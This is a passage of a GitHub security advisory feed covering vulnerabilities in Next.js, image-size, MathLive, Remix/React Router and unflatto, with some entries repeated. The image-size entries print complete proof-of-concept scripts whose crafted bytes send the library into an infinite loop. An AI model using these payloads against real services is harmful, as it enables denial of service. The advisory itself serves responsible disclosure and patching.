        <title type="html"><![CDATA[[next] Next.js may leak x-middleware-subrequest-id to external hosts]]></title>
        <id>https://github.com/advisories/GHSA-223j-4rm8-mrmf</id>
        <link href="https://github.com/advisories/GHSA-223j-4rm8-mrmf"/>
        <updated>2025-04-03T13:24:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the process of remediating <a href="https://github.com/advisories/GHSA-f82v-jwr5-mffw">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>
<p>Learn more <a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">here</a>.</p>
<h2 id="credit">Credit</h2>
<p>Thank you to Jinseo Kim <a href="https://hackerone.com/kjsman?type=user">kjsman</a> and&nbsp;<a href="https://hackerone.com/ryotak?type=user">RyotaK</a> (GMO Flatt Security Inc.) with <a href="https://takumi-san.ai">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30218">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>
<li><a href="https://github.com/advisories/GHSA-223j-4rm8-mrmf">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-223j-4rm8-mrmf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-02T22:35:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js may leak x-middleware-subrequest-id to external hosts]]></title>
        <id>https://github.com/advisories/GHSA-223j-4rm8-mrmf</id>
        <link href="https://github.com/advisories/GHSA-223j-4rm8-mrmf"/>
        <updated>2025-04-03T13:24:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the process of remediating <a href="https://github.com/advisories/GHSA-f82v-jwr5-mffw">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>
<p>Learn more <a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">here</a>.</p>
<h2 id="credit">Credit</h2>
<p>Thank you to Jinseo Kim <a href="https://hackerone.com/kjsman?type=user">kjsman</a> and&nbsp;<a href="https://hackerone.com/ryotak?type=user">RyotaK</a> (GMO Flatt Security Inc.) with <a href="https://takumi-san.ai">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30218">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>
<li><a href="https://github.com/advisories/GHSA-223j-4rm8-mrmf">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-223j-4rm8-mrmf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-02T22:35:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js may leak x-middleware-subrequest-id to external hosts]]></title>
        <id>https://github.com/advisories/GHSA-223j-4rm8-mrmf</id>
        <link href="https://github.com/advisories/GHSA-223j-4rm8-mrmf"/>
        <updated>2025-04-03T13:24:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the process of remediating <a href="https://github.com/advisories/GHSA-f82v-jwr5-mffw">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>
<p>Learn more <a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">here</a>.</p>
<h2 id="credit">Credit</h2>
<p>Thank you to Jinseo Kim <a href="https://hackerone.com/kjsman?type=user">kjsman</a> and&nbsp;<a href="https://hackerone.com/ryotak?type=user">RyotaK</a> (GMO Flatt Security Inc.) with <a href="https://takumi-san.ai">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30218">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>
<li><a href="https://github.com/advisories/GHSA-223j-4rm8-mrmf">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-223j-4rm8-mrmf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-02T22:35:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[image-size] image-size Denial of Service via Infinite Loop during Image Processing]]></title>
        <id>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</id>
        <link href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"/>
        <updated>2025-04-02T15:04:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>image-size</code> is vulnerable to a Denial of Service vulnerability when processing specially crafted images.</p>
<p>The issue occurs because of an infine loop in <code>findBox</code> when processing certain images with a box with size <code>0</code>.</p>
<h3 id="details">Details</h3>
<p>If the first bytes of the input does not match any bytes in <code>firstBytes</code>, then the package tries to validate the image using other handlers:</p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31
export function detector(input: Uint8Array): imageType | undefined {
  const byte = input[0]
  if (byte in firstBytes) {
    const type = firstBytes[byte]
    if (type &amp;&amp; typeHandlers[type].validate(input)) {
      return type
    }
  }

  const finder = (key: imageType) =&gt; typeHandlers[key].validate(input) //&lt;--
  return keys.find(finder)
}
</code></pre>
<p>Some handlers that call <code>findBox</code> to validate or calculate the image size are <code>jxl</code>, <code>heif</code> and <code>jp2</code>.</p>
<p><code>JXL</code> handler calls <code>findBox</code> inside <code>validate</code>. To reach the <code>findBox</code> call, the value at position <code>4:8</code> should be <code>'JXL '</code></p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60
export const JXL: IImage = {
  validate: (input: Uint8Array): boolean =&gt; {
    const boxType = toUTF8String(input, 4, 8)
    if (boxType !== 'JXL ') return false      //&lt;---

    const ftypBox = findBox(input, 'ftyp', 0) //&lt;---
    if (!ftypBox) return false

    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)
    return brand === 'jxl '
  },
</code></pre>
<p><code>findBox</code> can lead to an infine loop because the value of <code>box.size</code> is <code>0</code>, thus the <code>offset</code> variable is not updated. Below relevant code with comments (using one of the <code>PAYLOAD</code> below as example):</p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37
export const readUInt32BE = (input: Uint8Array, offset = 0) =&gt;
  input[offset] * 2 ** 24 +     // 0 +
  input[offset + 1] * 2 ** 16 + // 0 +
  input[offset + 2] * 2 ** 8 +  // 0 +
  input[offset + 3]             // 0

// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75
function readBox(input: Uint8Array, offset: number) {   // offset: 0
  if (input.length - offset &lt; 4) return
  const boxSize = readUInt32BE(input, offset)           // 0
  if (input.length - offset &lt; boxSize) return           // (8 - 0) &lt; 0 =&gt; false
  return {
    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '
    offset,                                             // 0
    size: boxSize,                                      // 0
  }
}

// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84
export function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0
  while (offset &lt; input.length) {         // 0 &lt; 8 =&gt; false
    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }
    if (!box) break                       // false
    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' =&gt; false
    offset += box.size                    // offset += 0
  }
}
</code></pre>
<p>A similar issue occurs for <code>HEIF</code> and <code>JP2</code> handlers:</p>
<ul>
<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts</a></li>
<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts</a></li>
</ul>
<h3 id="poc">PoC</h3>
<p>Usage:</p>
<pre><code class="language-bash">node main.js poc1|poc2
</code></pre>
<ul>
<li>poc for <code>image-size@2.0.1</code></li>
</ul>
<pre><code class="language-js">// mkdir 2.0.1
// cd 2.0.1/
// npm i image-size@2.0.1
const {imageSizeFromFile} = require("image-size/fromFile");
const {imageSize} = require("image-size");

const fs = require('fs');

// JXL
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x4A, 0x58, 0x4C, 0x20, // "JXL "
]);

// HEIF
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x66, 0x74, 0x79, 0x70, // "ftyp"
//   0x61, 0x76, 0x69, 0x66  // "avif"
// ]);

// JP2
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x6A, 0x50, 0x20, 0x20, // "jP  "
// ]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() { 
  (async () =&gt; {
    await imageSizeFromFile(FILENAME)
    console.log('Done') // never executed
  })();
}

function poc2() {
  imageSize(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<ul>
<li>poc for <code>image-size@1.2.0</code></li>
</ul>
<pre><code class="language-js">// mkdir 1.2.0
// cd 1.2.0/
// npm i image-size@1.2.0
const sizeOf = require("image-size");
const fs = require('fs');

// JXL
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x4A, 0x58, 0x4C, 0x20, // "JXL "
]);

// HEIF
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x66, 0x74, 0x79, 0x70, // "ftyp"
//   0x61, 0x76, 0x69, 0x66  // "avif"
// ]);

// JP2
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x6A, 0x50, 0x20, 0x20, // "jP  "
// ]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() {
  sizeOf(FILENAME)
  console.log('Done') // never executed
}

function poc2() {
  sizeOf(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<ul>
<li>poc for <code>image-size@1.1.1</code></li>
</ul>
<pre><code class="language-js">// mkdir 1.1.1
// cd 1.1.1/
// npm i image-size@1.1.1
const sizeOf = require("image-size");
const fs = require('fs');

// HEIF
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x66, 0x74, 0x79, 0x70, // "ftyp"
  0x61, 0x76, 0x69, 0x66  // "avif"
]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() {
  sizeOf(FILENAME)
  console.log('Done') // never executed
}

function poc2() {
  sizeOf(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of Service</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
<li><a href="https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68">https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68</a></li>
<li><a href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-02T15:04:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[image-size] image-size Denial of Service via Infinite Loop during Image Processing]]></title>
        <id>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</id>
        <link href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"/>
        <updated>2025-04-02T15:04:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>image-size</code> is vulnerable to a Denial of Service vulnerability when processing specially crafted images.</p>
<p>The issue occurs because of an infine loop in <code>findBox</code> when processing certain images with a box with size <code>0</code>.</p>
<h3 id="details">Details</h3>
<p>If the first bytes of the input does not match any bytes in <code>firstBytes</code>, then the package tries to validate the image using other handlers:</p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31
export function detector(input: Uint8Array): imageType | undefined {
  const byte = input[0]
  if (byte in firstBytes) {
    const type = firstBytes[byte]
    if (type &amp;&amp; typeHandlers[type].validate(input)) {
      return type
    }
  }

  const finder = (key: imageType) =&gt; typeHandlers[key].validate(input) //&lt;--
  return keys.find(finder)
}
</code></pre>
<p>Some handlers that call <code>findBox</code> to validate or calculate the image size are <code>jxl</code>, <code>heif</code> and <code>jp2</code>.</p>
<p><code>JXL</code> handler calls <code>findBox</code> inside <code>validate</code>. To reach the <code>findBox</code> call, the value at position <code>4:8</code> should be <code>'JXL '</code></p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60
export const JXL: IImage = {
  validate: (input: Uint8Array): boolean =&gt; {
    const boxType = toUTF8String(input, 4, 8)
    if (boxType !== 'JXL ') return false      //&lt;---

    const ftypBox = findBox(input, 'ftyp', 0) //&lt;---
    if (!ftypBox) return false

    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)
    return brand === 'jxl '
  },
</code></pre>
<p><code>findBox</code> can lead to an infine loop because the value of <code>box.size</code> is <code>0</code>, thus the <code>offset</code> variable is not updated. Below relevant code with comments (using one of the <code>PAYLOAD</code> below as example):</p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37
export const readUInt32BE = (input: Uint8Array, offset = 0) =&gt;
  input[offset] * 2 ** 24 +     // 0 +
  input[offset + 1] * 2 ** 16 + // 0 +
  input[offset + 2] * 2 ** 8 +  // 0 +
  input[offset + 3]             // 0

// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75
function readBox(input: Uint8Array, offset: number) {   // offset: 0
  if (input.length - offset &lt; 4) return
  const boxSize = readUInt32BE(input, offset)           // 0
  if (input.length - offset &lt; boxSize) return           // (8 - 0) &lt; 0 =&gt; false
  return {
    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '
    offset,                                             // 0
    size: boxSize,                                      // 0
  }
}

// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84
export function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0
  while (offset &lt; input.length) {         // 0 &lt; 8 =&gt; false
    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }
    if (!box) break                       // false
    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' =&gt; false
    offset += box.size                    // offset += 0
  }
}
</code></pre>
<p>A similar issue occurs for <code>HEIF</code> and <code>JP2</code> handlers:</p>
<ul>
<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts</a></li>
<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts</a></li>
</ul>
<h3 id="poc">PoC</h3>
<p>Usage:</p>
<pre><code class="language-bash">node main.js poc1|poc2
</code></pre>
<ul>
<li>poc for <code>image-size@2.0.1</code></li>
</ul>
<pre><code class="language-js">// mkdir 2.0.1
// cd 2.0.1/
// npm i image-size@2.0.1
const {imageSizeFromFile} = require("image-size/fromFile");
const {imageSize} = require("image-size");

const fs = require('fs');

// JXL
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x4A, 0x58, 0x4C, 0x20, // "JXL "
]);

// HEIF
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x66, 0x74, 0x79, 0x70, // "ftyp"
//   0x61, 0x76, 0x69, 0x66  // "avif"
// ]);

// JP2
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x6A, 0x50, 0x20, 0x20, // "jP  "
// ]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() { 
  (async () =&gt; {
    await imageSizeFromFile(FILENAME)
    console.log('Done') // never executed
  })();
}

function poc2() {
  imageSize(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<ul>
<li>poc for <code>image-size@1.2.0</code></li>
</ul>
<pre><code class="language-js">// mkdir 1.2.0
// cd 1.2.0/
// npm i image-size@1.2.0
const sizeOf = require("image-size");
const fs = require('fs');

// JXL
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x4A, 0x58, 0x4C, 0x20, // "JXL "
]);

// HEIF
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x66, 0x74, 0x79, 0x70, // "ftyp"
//   0x61, 0x76, 0x69, 0x66  // "avif"
// ]);

// JP2
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x6A, 0x50, 0x20, 0x20, // "jP  "
// ]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() {
  sizeOf(FILENAME)
  console.log('Done') // never executed
}

function poc2() {
  sizeOf(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<ul>
<li>poc for <code>image-size@1.1.1</code></li>
</ul>
<pre><code class="language-js">// mkdir 1.1.1
// cd 1.1.1/
// npm i image-size@1.1.1
const sizeOf = require("image-size");
const fs = require('fs');

// HEIF
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x66, 0x74, 0x79, 0x70, // "ftyp"
  0x61, 0x76, 0x69, 0x66  // "avif"
]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() {
  sizeOf(FILENAME)
  console.log('Done') // never executed
}

function poc2() {
  sizeOf(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of Service</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
<li><a href="https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68">https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68</a></li>
<li><a href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-02T15:04:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mathlive] Duplicate Advisory: MathLive's Lack of Escaping of HTML allows for XSS]]></title>
        <id>https://github.com/advisories/GHSA-929m-phjg-qwcc</id>
        <link href="https://github.com/advisories/GHSA-929m-phjg-qwcc"/>
        <updated>2025-04-02T00:33:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-qwj6-q94f-8425. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>Cross Site Scripting vulnerability in arnog MathLive Versions v0.103.0 and before (fixed in 0.104.0) allows an attacker to execute arbitrary code via the MathLive function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29049">https://nvd.nist.gov/vuln/detail/CVE-2025-29049</a></li>
<li><a href="https://github.com/arnog/mathlive/commit/abc26056fd5e29a99edfa96a0bbe855ea2a8b678">https://github.com/arnog/mathlive/commit/abc26056fd5e29a99edfa96a0bbe855ea2a8b678</a></li>
<li><a href="https://github.com/advisories/GHSA-qwj6-q94f-8425">https://github.com/advisories/GHSA-qwj6-q94f-8425</a></li>
<li><a href="https://github.com/advisories/GHSA-929m-phjg-qwcc">https://github.com/advisories/GHSA-929m-phjg-qwcc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-929m-phjg-qwcc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-01T21:31:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@remix-run/express] Remix and React Router allow URL manipulation via Host / X-Forwarded-Host headers]]></title>
        <id>https://github.com/advisories/GHSA-4q56-crqp-v477</id>
        <link href="https://github.com/advisories/GHSA-4q56-crqp-v477"/>
        <updated>2025-04-01T22:23:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>We received a report about a vulnerability in Remix/React Router that affects all Remix 2 and React Router 7 consumers using the Express adapter. Basically, this vulnerability allows anyone to spoof the URL used in an incoming <code>Request</code> by putting a URL pathname in the port section of a URL that is part of a <code>Host</code> or <code>X-Forwarded-Host</code> header sent to a Remix/React Router request handler.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been patched and released in Remix 2.16.3 React Router 7.4.1.</p>
<h3 id="credits">Credits</h3>
<ul>
<li>Rachid Allam (zhero;)</li>
<li>Yasser Allam (inzo_)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/remix-run/react-router/security/advisories/GHSA-4q56-crqp-v477">https://github.com/remix-run/react-router/security/advisories/GHSA-4q56-crqp-v477</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31137">https://nvd.nist.gov/vuln/detail/CVE-2025-31137</a></li>
<li><a href="https://github.com/advisories/GHSA-4q56-crqp-v477">https://github.com/advisories/GHSA-4q56-crqp-v477</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4q56-crqp-v477</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-01T22:23:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@react-router/express] Remix and React Router allow URL manipulation via Host / X-Forwarded-Host headers]]></title>
        <id>https://github.com/advisories/GHSA-4q56-crqp-v477</id>
        <link href="https://github.com/advisories/GHSA-4q56-crqp-v477"/>
        <updated>2025-04-01T22:23:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>We received a report about a vulnerability in Remix/React Router that affects all Remix 2 and React Router 7 consumers using the Express adapter. Basically, this vulnerability allows anyone to spoof the URL used in an incoming <code>Request</code> by putting a URL pathname in the port section of a URL that is part of a <code>Host</code> or <code>X-Forwarded-Host</code> header sent to a Remix/React Router request handler.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been patched and released in Remix 2.16.3 React Router 7.4.1.</p>
<h3 id="credits">Credits</h3>
<ul>
<li>Rachid Allam (zhero;)</li>
<li>Yasser Allam (inzo_)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/remix-run/react-router/security/advisories/GHSA-4q56-crqp-v477">https://github.com/remix-run/react-router/security/advisories/GHSA-4q56-crqp-v477</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31137">https://nvd.nist.gov/vuln/detail/CVE-2025-31137</a></li>
<li><a href="https://github.com/advisories/GHSA-4q56-crqp-v477">https://github.com/advisories/GHSA-4q56-crqp-v477</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4q56-crqp-v477</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-01T22:23:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@alizeait/unflatto] @alizeait/unflatto Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-q8jq-4rm5-4hm5</id>
        <link href="https://github.com/advisories/GHSA-q8jq-4rm5-4hm5"/>
        <updated>2025-04-01T14:54:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>alizeait unflatto &lt;= 1.0.2 was discovered to contain a prototype pollution via the method exports.unflatto at /dist/index.js. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been patched in 1.0.3</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/advisories/GHSA-799q-f2px-wx8c">https://github.com/advisories/GHSA-799q-f2px-wx8c</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/alizeait/unflatto/security/advisories/GHSA-q8jq-4rm5-4hm5">https://github.com/alizeait/unflatto/security/advisories/GHSA-q8jq-4rm5-4hm5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38988">https://nvd.nist.gov/vuln/detail/CVE-2024-38988</a></li>
<li><a href="https://github.com/alizeait/unflatto/issues/32">https://github.com/alizeait/unflatto/issues/32</a></li>
<li><a href="https://github.com/alizeait/unflatto/commit/3c1b120f1dcd44eefe07d4a5022e1baa3c7164d3">https://github.com/alizeait/unflatto/commit/3c1b120f1dcd44eefe07d4a5022e1baa3c7164d3</a></li>
<li><a href="https://gist.github.com/mestrtee/4c5dfb66bea377889c44dd6c8af28713">https://gist.github.com/mestrtee/4c5dfb66bea377889c44dd6c8af28713</a></li>
<li><a href="https://github.com/advisories/GHSA-q8jq-4rm5-4hm5">https://github.com/advisories/GHSA-q8jq-4rm5-4hm5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8jq-4rm5-4hm5</uri>
        </author>
        <category label="severity" term="HIGH"/>
